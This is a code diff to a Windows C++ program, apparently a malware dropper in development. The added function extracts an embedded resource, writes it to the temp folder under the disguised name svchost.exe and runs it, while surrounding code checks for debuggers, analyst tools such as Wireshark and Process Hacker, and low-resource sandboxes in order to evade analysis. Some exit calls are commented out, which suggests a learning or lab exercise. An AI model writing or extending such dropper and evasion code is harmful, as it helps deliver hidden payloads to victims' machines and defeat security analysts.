@@ -6,11 +6,17 @@
 #include <cstring>
 #include <string.h>
 #include <strsafe.h>
+#include <stdlib.h>
+#include <Processthreadsapi.h>
 #pragma comment(lib, "User32.lib")
 #define DIV 1024
+using namespace std;
 
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
 HANDLE ps;
 PROCESSENTRY32 psinfo;
+
 
 int exit()
 {
@@ -90,7 +96,7 @@ int appschk()
 
 	if (INVALID_HANDLE_VALUE == hFind)
 	{
-		std::cout << "FindFirstFile: INVALID HANDLE" << std::endl;
+		cout << "FindFirstFile: INVALID HANDLE" << endl;
 	}
 
 	while (FindNextFileW(hFind, &w32fd))
@@ -98,17 +104,17 @@ int appschk()
 		WCHAR* s = w32fd.cFileName;
 		if (wcsstr(s, L"Wireshark") || wcsstr(s, L"Process Hacker"))
 		{
-			//std::wcout << "Filename: " << w32fd.cFileName << std::endl;
+			//wcout << "Filename: " << w32fd.cFileName << endl;
 			return 1;
 		}
-		
+
 	}
 	return 0;
 
 	if (ERROR_NO_MORE_FILES != GetLastError())
- {
-		std::cout << "NO MORE FILES IN DIR" << std::endl;
- }
+	{
+		cout << "NO MORE FILES IN DIR" << endl;
+	}
 	FindClose(hFind);
 	return 0;
 }
@@ -116,43 +122,106 @@ int appschk()
 int dirchk()
 {
 	LPSTR cmdline = GetCommandLineA();
-	if (strstr(cmdline, "\\repos\\dropper\\Debug"))
+	if (strstr(cmdline, "\\AppData\\Local\\Temp\\"))
 	{
-		std::cout << "Correct Directory!" << std::endl;
+		cout << "Correct Directory!" << endl;
+		return 0;
 	}
 	else
 	{
-		std::cout << "Incorrect Directory!" << cmdline << std::endl;
+		cout << "Exit: Incorrect Directory!" << cmdline << endl;
+		return 1;
 	}
-	std::cout << "Commandline: " << cmdline << std::endl;
+}
+
+int dropexe()
+{
+	HRSRC hRsc = FindResourceExW(NULL, RT_RCDATA, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
+	if (hRsc == 0)
+	{
+		int err = GetLastError();
+		cout << "FindResource Error: " << err << endl;
+	}
+	else
+	{
+		HGLOBAL hData = LoadResource(NULL, hRsc);
+		if (hData == 0)
+		{
+			int err = GetLastError();
+			cout << "LoadResource Error: " << err << endl;
+		}
+		else
+		{
+			DWORD sizeRsc = SizeofResource(NULL, hRsc);
+			TCHAR tmpPathBuff[MAX_PATH];
+			GetTempPathW(MAX_PATH, tmpPathBuff);
+			lstrcat(tmpPathBuff, L"\svchost.exe");
+			//wcout << L"Temp Path: " << tmpPathBuff << endl;
+			HANDLE hExe = CreateFileW(tmpPathBuff, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hExe == 0)
+			{
+				int err = GetLastError();
+				cout << "CreateFile Error: " << err << endl;
+			}
+			else
+			{
+				if (WriteFile(hExe, hData, sizeRsc, NULL, NULL))
+				{
+					CloseHandle(hExe);
+					ZeroMemory(&si, sizeof(si));
+					si.cb = sizeof(si);
+					ZeroMemory(&pi, sizeof(pi));
+					BOOL bProc = CreateProcessW(tmpPathBuff, NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_NEW_CONSOLE, (LPVOID)NULL, NULL, (LPSTARTUPINFOW)&si, (LPPROCESS_INFORMATION)&pi);
+					if (bProc == 0)
+					{
+						CloseHandle(hExe);
+						int err = GetLastError();
+						cout << "CreateProcess Error: " << err << endl;
+					};
+					return 1;
+				}
+				else
+				{
+					CloseHandle(hExe);
+					int err = GetLastError();
+					cout << "WriteFile Error: " << err << endl;
+				}
+				
+			}
+			CloseHandle(hExe);
+		}
+	}
 	return 0;
 }
 int main()
 {
-	dirchk();
+	dropexe();
+	if (dirchk() == 1)
+	{
+		cout << "Exit: Wrong directory!" << endl;
+	}
 	if (dbgchk()) // return 1 if dbgflag is set, 0 if not
 	{
-		std::cout << "Exit: Debugger detected!" << std::endl;
+		cout << "Exit: Debugger detected!" << endl;
 		//exit();
 	}
 	if (appschk())
 	{
-		std::cout << "Exit: Analyst tool installed!" << std::endl;
+		cout << "Exit: Analyst tool installed!" << endl;
 		//exit();
 	}
 	if (sysinfo() == 2) // return 2 if low processor count, return 1 low ram 
 	{
-		std::cout << "Exit: Low process count" << std::endl;
+		cout << "Exit: Low process count" << endl;
 		//exit();
 	}
 	else if (sysinfo() == 1)
 	{
-		//std::cout << "Exit: Low RAM" << std::endl;
+		//cout << "Exit: Low RAM" << endl;
 	}
 	if (pschk()) // return 1 if analyst tools is in process listing
 	{
-		std::cout << "Exit: Analyst tool running!" << std::endl;
+		cout << "Exit: Analyst tool running!" << endl;
 		//exit();
 	}
 }
-
